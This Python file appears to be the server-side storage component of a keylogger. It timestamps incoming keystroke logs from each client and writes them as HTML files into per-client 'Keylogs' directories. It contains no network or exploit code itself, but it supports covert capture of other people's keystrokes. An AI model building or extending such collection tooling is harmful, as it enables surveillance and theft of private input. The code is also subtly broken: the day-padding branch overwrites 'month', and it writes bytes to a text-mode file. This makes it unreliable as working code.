import os
import datetime

def get_date_time():
    now = datetime.datetime.now()
    year = now.year
    month = now.month
    if len(str(month)) < 2:
        month = '0'+str(month)
    day = now.day
    if len(str(day)) < 2:
        month = '0'+str(day)
    hour = now.hour
    minute = now.minute
    second = now.second
    return '%s-%s-%s_%s-%s-%s' % (year, month, day, hour, minute, second)


def html_generator(client_id, data, storage):
    date = get_date_time()
    dir = check_client_storage(storage, client_id, date.split('_')[0])
    html_file_path = os.path.join(dir, '%s.html' % date)
    with open(html_file_path, 'w') as html_file:
        html_file.write(data['logs'].encode('utf-8'))
    return html_file_path, date


def check_client_storage(storage, client_id, date):
    screenshot_path = os.path.join(storage, client_id, 'Keylogs', date)
    if not os.path.exists(screenshot_path):
        os.makedirs(screenshot_path)
    return screenshot_path
